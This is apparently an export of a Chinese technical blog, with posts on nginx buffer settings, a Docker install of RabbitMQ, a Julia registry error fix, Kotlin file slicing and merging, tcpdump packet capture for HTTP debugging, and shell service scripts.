class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<p>文章内容数据量比较大,修改nginx的缓存区大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client_header_buffer_size 1m;</span><br><span class="line">large_client_header_buffers 4 1m;</span><br></pre></td></tr></table></figure>
<p>重启nginx即可.</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>rabbitmq安装(docker)</title>
    <url>/2018/12/14/mq/rabbitmq%E5%AE%89%E8%A3%85(docker)/</url>
    <content><![CDATA[<p>docker的安装此处不做过多介绍,可参考<a href="https://docs.docker.com/install/linux/docker-ce/centos/" target="_blank" rel="noopener">官网安装即可</a>。<br><a id="more"></a></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>搜索要下载的rabbitmq,<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment">#  docker search rabbitmq</span></span><br><span class="line">NAME                                       DESCRIPTION                                     STARS               OFFICIAL            AUTOMATED</span><br><span class="line">rabbitmq                                   RabbitMQ is an open <span class="built_in">source</span> multi-protocol me…   2372                [OK]                </span><br><span class="line">bitnami/rabbitmq                           Bitnami Docker Image <span class="keyword">for</span> RabbitMQ               25                                      [OK]</span><br><span class="line">tutum/rabbitmq                             Base docker image to run a RabbitMQ server      19                                      </span><br><span class="line">frodenas/rabbitmq                          A Docker Image <span class="keyword">for</span> RabbitMQ                     12                                      [OK]</span><br><span class="line">kbudde/rabbitmq-exporter                   rabbitmq_exporter <span class="keyword">for</span> prometheus                9                                       [OK]</span><br><span class="line">sysrun/rpi-rabbitmq                        RabbitMQ Container <span class="keyword">for</span> the Raspberry Pi 2 (b…   7                                       </span><br><span class="line">arm32v7/rabbitmq                           RabbitMQ is an open <span class="built_in">source</span> multi-protocol me…   7                                       </span><br><span class="line">gonkulatorlabs/rabbitmq                    DEPRECATED: See maryville/rabbitmq              5                                       [OK]</span><br><span class="line">cyrilix/rabbitmq-mqtt                      RabbitMQ MQTT Adapter                           4                                       [OK]</span><br><span class="line">aweber/rabbitmq-autocluster                RabbitMQ with the Autocluster Plugin            4                                       </span><br><span class="line">pivotalrabbitmq/rabbitmq-autocluster       RabbitMQ with the rabbitmq-autocluster plugi…   3                                       </span><br><span class="line">mikaelhg/docker-rabbitmq                   RabbitMQ <span class="keyword">in</span> Docker.                             3                                       [OK]</span><br><span class="line">luiscoms/openshift-rabbitmq                RabbitMQ docker image to use on Openshift ba…   3                                       [OK]</span><br><span class="line">pivotalrabbitmq/rabbitmq-server-buildenv   Image used to build and <span class="built_in">test</span> RabbitMQ server…   2                                       </span><br><span class="line">gavinmroy/alpine-rabbitmq-autocluster      Minimal RabbitMQ image with the autocluster …   2                                       </span><br><span class="line">authentise/rabbitmq                        A RabbitMQ image that will run a bash script…   2                                       [OK]</span><br><span class="line">webhostingcoopteam/rabbitmq-conf           RabbitMQ Configurator <span class="keyword">for</span> Rancher               1                                       [OK]</span><br><span class="line">henrylv206/rabbitmq-autocluster            RabbitMQ Cluster                                1                                       [OK]</span><br><span class="line">cvtjnii/rabbitmq                                                                           1                                       </span><br><span class="line">foxylion/rabbitmq                          Preconfigured RabbitMQ docker image with sup…   1                                       [OK]</span><br><span class="line">pdffiller/rabbitmq                         Rabbitmq 3.7.3 with delayed_message plugin,c…   0                                       </span><br><span class="line">newsdev/rabbitmq                           rabbitmq:olympics Extends official rabbitmq …   0                                       [OK]</span><br><span class="line">deadtrickster/rabbitmq_prometheus          RabbitMQ + Prometheus RabbitMQ Exporter plug…   0                                       </span><br><span class="line">ekesken/rabbitmq                           docker image <span class="keyword">for</span> rabbitmq that is configurab…   0                                       [OK]</span><br><span class="line">vituity/openshift-rabbitmq                 RabbitMQ <span class="keyword">for</span> OpenShift</span><br></pre></td></tr></table></figure></p>
<p>下载对应的版本,此处下载第一个官方版本。默认latest是没有web管理界面的，下载tag为management的带有web管理界面。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker pull rabbitmq:management</span></span><br><span class="line">management: Pulling from library/rabbitmq</span><br><span class="line">f17d81b4b692: Downloading [===================&gt;                               ]  8.981MB/22.49MB</span><br><span class="line">02fe1bd1a85c: Download complete </span><br><span class="line">66c15a50f4da: Download complete </span><br><span class="line">771c4c62018c: Download complete </span><br><span class="line">05e166e2684c: Download complete </span><br><span class="line">5eb4efce3466: Downloading [=======&gt;                                           ]  4.226MB/27.5MB</span><br><span class="line">9b5d77af0f63: Downloading [================&gt;                                  ]  3.493MB/10.34MB</span><br><span class="line">f7fc14f8eeeb: Waiting </span><br><span class="line">31e1448101d9: Waiting </span><br><span class="line">196612f40314: Waiting </span><br><span class="line">8cd7ab5c5659: Waiting </span><br><span class="line">aae6dd0bf4aa: Waiting </span><br><span class="line">c8f2ac2cd4e8: Waiting </span><br><span class="line">98e5c73758c4: Waiting</span><br></pre></td></tr></table></figure>
<p>等待执行完成即可。</p>
<p>启动这个镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker run -d -p 5672:5672 -p 15672:15672 --name rabbitmq rabbitmq:management</span></span><br><span class="line"></span><br><span class="line">c3a9f6d71ad22d14ec12e488a1917fbe59c7a6f18414402e3eac2418769c3fdf</span><br></pre></td></tr></table></figure>
<p>查看日志</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker logs c3a9f6d71ad22d14ec12e488a1917fbe59c7a6f18414402e3eac2418769c3fdf</span></span><br></pre></td></tr></table></figure>
<p>查看启动状态<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker ps -a</span></span><br><span class="line"></span><br><span class="line">CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS              PORTS                                                                                        NAMES</span><br><span class="line">c3a9f6d71ad2        rabbitmq:management   <span class="string">"docker-entrypoint.s…"</span>   8 minutes ago       Up 8 minutes        4369/tcp, 5671/tcp, 0.0.0.0:5672-&gt;5672/tcp, 15671/tcp, 25672/tcp, 0.0.0.0:15672-&gt;15672/tcp   rabbitmq</span><br></pre></td></tr></table></figure></p>
<p>可见服务正常启动。</p>
<p>接下来，访问web控制台URL</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># curl localhost:15672</span></span><br><span class="line"></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span> /&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;RabbitMQ Management&lt;/title&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/ejs-1.0.min.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery-1.12.4.min.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery.flot-0.8.1.min.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/jquery.flot-0.8.1.time.min.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/sammy-0.7.6.min.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/json2-2016.10.28.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/base64.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/global.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/main.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/prefs.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/formatters.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/charts.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    &lt;link href=<span class="string">"css/main.css"</span> rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span>/&gt;</span><br><span class="line">    &lt;link href=<span class="string">"favicon.ico"</span> rel=<span class="string">"shortcut icon"</span> <span class="built_in">type</span>=<span class="string">"image/x-icon"</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--[<span class="keyword">if</span> lte IE 8]&gt;</span><br><span class="line">    &lt;script src=<span class="string">"js/excanvas.min.js"</span> <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;link href=<span class="string">"css/evil.css"</span> rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span>/&gt;</span><br><span class="line">&lt;![endif]--&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">"outer"</span>&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div id=<span class="string">"debug"</span>&gt;&lt;/div&gt;</span><br><span class="line">    &lt;div id=<span class="string">"scratch"</span>&gt;&lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这样就正常启动了,正常使用即可。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><p><a href="https://docs.docker.com/" target="_blank" rel="noopener">docker官网</a></p>
</li>
<li><p>《docker技术入门与实战》</p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>mq</category>
      </categories>
      <tags>
        <tag>rabbitmq</tag>
      </tags>
  </entry>
  <entry>
    <title>julia not found in project, manifest or registry</title>
    <url>/2019/01/08/julia/julia%20not%20found%20in%20project,%20manifest%20or%20registry/</url>
    <content><![CDATA[<p>julia 1.0.3 版本添加包的时候抛出异常.julia not found in project, manifest or registry</p>
<figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">(v1<span class="number">.0</span>) pkg&gt; add https://github.com/JuliaIO/JSON.jl</span><br><span class="line">   Cloning git-repo <span class="string">`https://github.com/JuliaIO/JSON.jl`</span></span><br><span class="line">  Updating git-repo <span class="string">`https://github.com/JuliaIO/JSON.jl`</span></span><br><span class="line">[ Info: Assigning UUID a4e475aa-<span class="number">2</span>c49-<span class="number">59</span>aa-<span class="number">8</span>c9b-<span class="number">6</span>b302a36b041 to JSON</span><br><span class="line"> Resolving package versions...</span><br><span class="line">ERROR: The following package names could not be resolved:</span><br><span class="line"> * julia (not found <span class="keyword">in</span> project, manifest or registry)</span><br><span class="line">Please specify by known <span class="string">`name=uuid`</span>.</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>添加JSON包的时候抛出这个错误,最终在julia论坛中发现这个问题的解决方法,这个是julia的一个bug。执行下面命令即可.<br><figure class="highlight julia"><table><tr><td class="code"><pre><span class="line">julia&gt; rm(joinpath(homedir(), <span class="string">".julia"</span>, <span class="string">"registries"</span>); recursive=<span class="literal">true</span>)</span><br></pre></td></tr></table></figure></p>
<p>再次添加包即可.</p>
<p><img src="/2019/01/08/julia/julia not found in project, manifest or registry/20190108163704.png" alt></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote>
<ul>
<li><a href="https://discourse.julialang.org/t/pkg-add-ijulia-can-not-work/13341" target="_blank" rel="noopener">pkg-add-ijulia-can-not-work</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>julia</category>
      </categories>
      <tags>
        <tag>julia</tag>
      </tags>
  </entry>
  <entry>
    <title>文件切片与合并(Kotlin版)</title>
    <url>/2022/02/24/java/%E6%96%87%E4%BB%B6%E5%88%87%E7%89%87%E4%B8%8E%E5%90%88%E5%B9%B6(kotlin%E7%89%88)/</url>
    <content><![CDATA[<p>在项目中可能需要处理一些较大的日志、视频等文件的上传问题,可能会因为网络或请求头大小限制等问题，导致上传失败​。为此，文件切片的需求就派上了用场,思路比较容易想到,将大文件分割为多个小的文件,再批量上传小文件​,待小文件全部上传成功,最后再合并为一个完成的大文件。</p>
<p>接下来就用Kotlin(Java)来实现本地版的文件切片与合并。</p>
<p>第一步首先将文件分割为指定大小的文件,以下就是全部的分割文件的实现,主要用RandomAccessFile来实现文件的随机读。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 文件切片.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> blockSize 切片大小,默认1M.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filePath 文件路径</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">slice</span><span class="params">(blockSize: <span class="type">Int</span> = <span class="number">1024</span> * <span class="number">1024</span>, filePath: <span class="type">String</span>)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> pos: <span class="built_in">Long</span></span><br><span class="line">            <span class="keyword">val</span> file = File(filePath)</span><br><span class="line">            <span class="comment">// 文件名称</span></span><br><span class="line">            <span class="keyword">val</span> fileName = file.name</span><br><span class="line">            <span class="keyword">val</span> rds = RandomAccessFile(file, <span class="string">"r"</span>)</span><br><span class="line">            <span class="keyword">val</span> fileSize = rds.length()</span><br><span class="line">            <span class="keyword">val</span> subBlockNumber = fileSize / blockSize</span><br><span class="line">            <span class="comment">// 是否还有剩余字节</span></span><br><span class="line">            <span class="keyword">val</span> leave = fileSize - (subBlockNumber * blockSize)</span><br><span class="line">            <span class="keyword">val</span> blockNumber = <span class="keyword">if</span> (leave != <span class="number">0L</span>) subBlockNumber + <span class="number">1</span> <span class="keyword">else</span> subBlockNumber</span><br><span class="line">            <span class="keyword">val</span> bufferSize = ByteArray(blockSize)</span><br><span class="line">            <span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">0</span> until blockNumber - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 切片文件名称</span></span><br><span class="line">                <span class="keyword">val</span> sliceFileName = fileName + <span class="string">"_"</span> + i</span><br><span class="line">                FileOutputStream(File(<span class="string">"D:\\data\\<span class="variable">$sliceFileName</span>"</span>)).use&#123;</span><br><span class="line">                    pos = (i * blockSize)</span><br><span class="line">                    log.info(<span class="string">"i = &#123;&#125;,pos = &#123;&#125; "</span>, i, pos)</span><br><span class="line">                    rds.seek(pos)</span><br><span class="line">                    rds.read(bufferSize, <span class="number">0</span>, bufferSize.size)</span><br><span class="line">                    it.write(bufferSize)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">val</span> sliceFileName = fileName + <span class="string">"_"</span> + (blockNumber - <span class="number">1</span>)</span><br><span class="line">            FileOutputStream(File(<span class="string">"D:\\data\\<span class="variable">$sliceFileName</span>"</span>)).use&#123;</span><br><span class="line">                pos = (blockNumber - <span class="number">1</span>) * blockSize</span><br><span class="line">                <span class="keyword">val</span> finalSize = fileSize - (blockNumber - <span class="number">1</span>) * blockSize</span><br><span class="line">                log.info(<span class="string">"pos = &#123;&#125;,finalSize=&#123;&#125;"</span>, pos, finalSize)</span><br><span class="line">                <span class="keyword">val</span> finalBufferArray = ByteArray(finalSize.toInt())</span><br><span class="line">                rds.seek(pos)</span><br><span class="line">                rds.read(finalBufferArray, <span class="number">0</span>, finalSize.toInt())</span><br><span class="line">                <span class="comment">// 保存切片文件</span></span><br><span class="line">                it.write(finalBufferArray)</span><br><span class="line">            &#125;</span><br><span class="line">            log.info(<span class="string">"finish..."</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            log.error(<span class="string">"file slice error,ex = &#123;&#125;"</span>, e)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>第二步,待文件切分完成后开始合并切片文件为一个完成的大文件。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 合并文件.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetFilePath 合成的目标文件路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> filePath 需要合并的切片文件路径</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">merge</span><span class="params">(targetFilePath: <span class="type">String</span>, filePath: <span class="type">String</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">var</span> raf: RandomAccessFile? = <span class="literal">null</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">val</span> sliceFiles = File(filePath)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">val</span> sliceFileArray = sliceFiles.listFiles()</span><br><span class="line">            <span class="comment">//申明随机读取文件RandomAccessFile</span></span><br><span class="line">            raf = RandomAccessFile(File(targetFilePath), <span class="string">"rw"</span>)</span><br><span class="line">            <span class="keyword">val</span> sliceCount = sliceFileArray.size</span><br><span class="line">            <span class="comment">//开始合并文件，对应切片的二进制文件</span></span><br><span class="line">            <span class="keyword">for</span> (i <span class="keyword">in</span> <span class="number">0</span> until sliceCount) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> targetFile = sliceFileArray.find &#123; x -&gt;</span><br><span class="line">                    x.name.endsWith(<span class="string">"_<span class="variable">$i</span>"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//读取切片文件</span></span><br><span class="line">                targetFile?.let &#123; it -&gt;</span><br><span class="line">                    log.info(<span class="string">"merge, i = &#123;&#125;,fileName=&#123;&#125;"</span>, i, it.name)</span><br><span class="line">                    <span class="keyword">val</span> reader = RandomAccessFile(it, <span class="string">"r"</span>)</span><br><span class="line">                    <span class="keyword">val</span> b = ByteArray(<span class="number">1024</span>)</span><br><span class="line">                    <span class="keyword">var</span> n: <span class="built_in">Int</span></span><br><span class="line">                    <span class="keyword">while</span> (reader.read(b).also &#123; rd -&gt; n = rd &#125; != -<span class="number">1</span>) &#123;</span><br><span class="line">                        raf.write(b, <span class="number">0</span>, n)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            e.printStackTrace()</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                raf!!.close()</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e: IOException) &#123;</span><br><span class="line">                e.printStackTrace()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>以上就是大文件分割与合并的实现。如果原文件切片再合并后可正常使用说明没有问题,否则就可能是切片时的字节位置错误,导致最后合并的文件非原文件格式而失败。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>awk使用案例</title>
    <url>/2021/07/01/linux/awk/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux tcpdump抓包</title>
    <url>/2018/05/23/linux/linux%20tcpdump%20%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<p>tcpdump是在命令行下运行的常用数据包分析器。它允许用户显示通过计算机所连接的网络传输或接收的TCP/IP和其他数据包。根据BSD许可分发,tcpdump是免费软件。<br>tcpdump适用于大多数类Unix 操作系统：Linux，Solaris，BSD，macOS，HP-UX，Android和AIX等。在这些系统中,tcpdump使用libpcap库来捕获数据包。Windows的tcpdump 的端口称为WinDump; 它使用WinPcap，libpcap的Windows端口。<br>                                                                                        —— wiki</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>centos安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install tcpdump</span><br></pre></td></tr></table></figure>
<p>命令参数<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -h</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       tcpdump - dump traffic on a network</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       tcpdump [ -AdDefIJKlLnNOpqRStuUvxX ] [ -B buffer_size ] [ -c count ]</span><br><span class="line">               [ -C file_size ] [ -G rotate_seconds ] [ -F file ]</span><br><span class="line">               [ -i interface ] [ -j tstamp_type ] [ -m module ] [ -M secret ]</span><br><span class="line">               [ -Q|-P in|out|inout ]</span><br><span class="line">               [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ]</span><br><span class="line">               [ -W filecount ]</span><br><span class="line">               [ -E spi@ipaddr algo:secret,...  ]</span><br><span class="line">               [ -y datalinktype ] [ -z postrotate-command ] [ -Z user ]</span><br><span class="line">               [ expression ]</span><br></pre></td></tr></table></figure></p>
<p>常用命令参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-A       以ASCII格式打印每个数据包(不包含其链接级别标题）;方便捕捉网页;</span><br><span class="line">-B       将操作系统捕获缓冲区大小设置为buffer_size。</span><br><span class="line">-d 　　　将匹配信息包的代码以人们能够理解的汇编格式给出;</span><br><span class="line">-dd 　　 将匹配信息包的代码以c语言程序段的格式给出;</span><br><span class="line">-ddd 　　将匹配信息包的代码以十进制的形式给出;</span><br><span class="line">-e 　　　在输出行打印出数据链路层的头部信息，包括源mac和目的mac，以及网络层的协议;</span><br><span class="line">-f 　　　将外部的Internet地址以数字的形式打印出来;</span><br><span class="line">-F       使用文件作为过滤器表达式的输入.在命令行上给出的附加表达式将被忽略;</span><br><span class="line">-l 　　　使标准输出变为缓冲行形式;</span><br><span class="line">-n 　　　指定将每个监听到数据包中的域名转换成IP地址后显示，不把网络地址转换成名字;</span><br><span class="line">-nn      指定将每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号后显示</span><br><span class="line">-t 　　　在输出的每一行不打印时间戳;</span><br><span class="line">-tt      在每个转储线上打印未格式化的时间戳;</span><br><span class="line">-ttt     在每个转储线上打印当前行和前一行之间的增量(微秒分辨率);</span><br><span class="line">-tttt    在每个转储线上按日期打印默认格式的时间戳;</span><br><span class="line">-ttttt   在每个转储线上打印当前和第一行之间的增量(微秒分辨率);</span><br><span class="line">-v 　　　输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息;</span><br><span class="line">-vv 　　 输出详细的报文信息;</span><br><span class="line">-c 　　　在收到指定的包的数目后，tcpdump就会停止;</span><br><span class="line">-F 　　　从指定的文件中读取表达式,忽略其它的表达式;</span><br><span class="line">-i 　　　指定监听的网络接口;</span><br><span class="line">-p       将网卡设置为非混杂模式，不能与host或broadcast一起使用;</span><br><span class="line">-r 　　　从指定的文件中读取包(这些包一般通过-w选项产生);</span><br><span class="line">-w 　　　直接将包写入文件中，并不分析和打印出来;</span><br><span class="line">-s       snaplen    snaplen表示从一个包中截取的字节数。0表示包不截断，抓完整的数据包。默认的话tcpdump只显示部分数据包,默认68字节;</span><br><span class="line">-T 　　 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc和snmp</span><br><span class="line">-X      告诉tcpdump命令,需要把协议头和包内容都原原本本的显示出来(tcpdump会以16进制和ASCII的形式显示),这在进行协议分析时是绝对的利器;</span><br><span class="line">-y      设置捕获数据链路类型时使用的数据链路类型;</span><br></pre></td></tr></table></figure></p>
<h2 id="常用示例"><a href="#常用示例" class="headerlink" title="常用示例"></a>常用示例</h2><h3 id><a href="#" class="headerlink" title=" "></a> </h3><blockquote>
<ul>
<li><p>监听eth0网卡HTTP 80端口的request和response</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)'</span><br></pre></td></tr></table></figure>
</li>
<li><p>监听eth0网卡HTTP 80端口的request和response,指定来源域名”example.com”，也可以指定具体IP</p>
</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -A -s 0 'src example.com and tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)'</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>监听本机发送至本机的HTTP 80端口的request和response</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -i lo -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)'</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li><p>HTTP GET request信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -A -s 0 'tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420'</span><br></pre></td></tr></table></figure>
</li>
<li><p>HTTP POST request信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump  -A -s 0 'tcp dst port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)'</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<p>包信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4:00:01.094570 IP 101.169.176.103.47738 &gt; 10.10.0.1.80: Flags [P.], seq 2971644064:2971644477, ack 4255769542, win 65535, length 413</span><br><span class="line">Ed....@.2...yEL.</span><br><span class="line">....zm.........P.......POST  </span><br><span class="line">/password HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 142</span><br><span class="line">Host: 10.10.0.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Cookie: SESSION=8df0a6d1-3212-492c-871e-3</span><br><span class="line">User-Agent: okhttp/3.3.1</span><br><span class="line"></span><br><span class="line">phone=19900000000&amp;password=123456&amp;sign=MWU1ZDZkZTNhNDVkMDVmOTAzNGIwOTRjODA3ZGI&amp;timestamp=&amp;client_type=A</span><br></pre></td></tr></table></figure></p>
<h2 id="Fiddler图形化查看数据包"><a href="#Fiddler图形化查看数据包" class="headerlink" title="Fiddler图形化查看数据包"></a>Fiddler图形化查看数据包</h2><h3 id="将数据包保存pack-cap"><a href="#将数据包保存pack-cap" class="headerlink" title="将数据包保存pack.cap"></a>将数据包保存pack.cap</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -A -s 0 'tcp port 28080 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)' -vv  -w /opt/pack.cap</span><br></pre></td></tr></table></figure>
<p>下载到本地,导入fiddler,File-&gt;import sessions-&gt;Packet Capture 即可查看.</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linux自定义服务启动脚本</title>
    <url>/2019/08/13/linux/linux%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>如题,启动 java 程序的时候启停服务比较麻烦,自定义 shell 脚本来完成此项任务.</p>
<a id="more"></a>
<p>shell 的语法脚本看着比较怪.</p>
<h1 id="shift-用法"><a href="#shift-用法" class="headerlink" title="shift 用法"></a>shift 用法</h1><p>shift 参数操作，是将参数从左到右逐个移动。</p>
<p>比如：现在有$1, $2, $3, $4, $5, ….几个参数<br>shift操作后，$1 被处理过之后，$2变为$1, $3变为$2, $4变为$3, $5变为$4, …  就这样依次变动<br>shift 操作后，参数还是按照上面的一个规律进行变化。</p>
